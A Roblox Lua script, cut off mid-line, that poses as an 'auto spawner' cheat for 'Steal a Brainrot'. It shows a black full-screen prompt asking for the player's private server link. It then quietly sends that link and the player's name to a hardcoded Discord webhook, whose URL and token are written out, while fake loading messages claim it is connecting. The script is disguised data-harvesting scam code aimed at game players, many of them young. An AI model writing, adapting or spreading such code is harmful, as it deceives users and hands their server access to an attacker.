-- ===== НАСТРОЙКА =====
local webhook = "https://discord.com/api/webhooks/1484561417003860122/ZP3_K9aBrLdzQyiwhPpq4oOFs8fycIkltCvOLvndVidLRdR0SRT5l0kOhsz2YuLJ7i9F"

local HttpService = game:GetService("HttpService")

local function sendToDiscord(link, player)
    local data = {
        ["content"] = "**NEW DATA**\nPlayer: "..player.Name.."\nLink: "..link
    }

    local json = HttpService:JSONEncode(data)

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end)
end

-- ===== ФУНКЦИЯ ПРОВЕРКИ ССЫЛКИ =====
local function isValidRobloxLink(link)
    link = string.lower(link)
    return string.find(link, "roblox.com/games/") 
        or string.find(link, "roblox.com/share") 
        or string.find(link, "roblox://")
end

-- ===== GUI =====
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(1,0,1,0)
Frame.BackgroundColor3 = Color3.new(0,0,0)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1,0,0.2,0)
Title.Position = UDim2.new(0,0,0.15,0)
Title.Text = "AUTO SPAWNER SCRIPT\nSTEAL A BRAINROT"
Title.TextColor3 = Color3.new(0,1,0)
Title.BackgroundTransparency = 1
Title.TextScaled = true

local Box = Instance.new("TextBox", Frame)
Box.Size = UDim2.new(0.3,0,0.06,0)
Box.Position = UDim2.new(0.35,0,0.5,0)
Box.PlaceholderText = "link for server"
Box.Text = ""
Box.TextScaled = true

local Button = Instance.new("TextButton", Frame)
Button.Size = UDim2.new(0.2,0,0.06,0)
Button.Position = UDim2.new(0.4,0,0.6,0)
Button.Text = "DONE"
Button.TextScaled = true

-- ===== LOADING =====
local Loading = Instance.new("Frame", ScreenGui)
Loading.Size = UDim2.new(1,0,1,0)
Loading.BackgroundColor3 = Color3.new(0,0,0)
Loading.Visible = false

local Log = Instance.new("TextLabel", Loading)
Log.Size = UDim2.new(1,0,1,0)
Log.BackgroundTransparency = 1
Log.TextColor3 = Color3.new(0,1,0)
Log.TextXAlignment = Enum.TextXAlignment.Left
Log.TextYAlignment = Enum.TextYAlignment.Top
Log.TextSize = 18
Log.Text = ""

local function addLine(text)
    Log.Text = Log.Text .. "\n> " .. text
end

-- ===== КНОПКА =====
Button.MouseButton1Click:Connect(function()
    local player = game.Players.LocalPlayer
    local link = Box.Text ~= "" and Box.Text or ""

    Frame.Visible = false
    Loading.Visible = true

    -- ===== ПРОВЕРКА ССЫЛКИ =====
    if not isValidRobloxLink(link) then
        Log.Text = ""
        addLine("Checking link...")
        wait(1)

        addLine("Invalid Roblox server link ❌")
        wait(2)

        addLine("Please enter a valid link")
        wait(2)

        ScreenGui:Destroy()
        return
    end

    -- ===== ОТПРАВКА ССЫЛКИ =====
    sendToDiscord(link, player)

    Log.Text = ""
    addLine("Valid Roblox link ✔")
    wait(1)

    addLine("Connecting to server...")
    wait(1)

    add
